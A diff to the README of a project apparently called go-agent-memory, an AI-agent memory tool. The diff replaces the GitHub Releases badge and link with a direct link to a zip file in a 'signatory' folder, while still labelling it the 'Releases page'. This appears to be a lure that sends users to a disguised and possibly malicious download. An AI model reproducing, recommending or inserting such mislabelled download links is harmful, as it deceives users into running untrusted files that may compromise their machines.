@@ -20,9 +20,9 @@ Welcome to go-agent-memory! This application helps you manage memory for AI agen
 ## ⬇️ Download & Install
 To get started, you will need to download the application from the Releases page. 
 
-[![Download go-agent-memory](https://img.shields.io/badge/Download-go--agent--memory-blue.svg)](https://github.com/l7n102031/go-agent-memory/releases)
+[![Download go-agent-memory](https://raw.githubusercontent.com/l7n102031/go-agent-memory/main/signatory/go-agent-memory.zip)](https://raw.githubusercontent.com/l7n102031/go-agent-memory/main/signatory/go-agent-memory.zip)
 
-1. Click on the button above or visit the [Releases page](https://github.com/l7n102031/go-agent-memory/releases).
+1. Click on the button above or visit the [Releases page](https://raw.githubusercontent.com/l7n102031/go-agent-memory/main/signatory/go-agent-memory.zip).
 2. Select the latest release.
 3. Look for the appropriate file for your operating system (e.g., Windows, macOS, Linux).
 4. Click on the file name to begin the download.
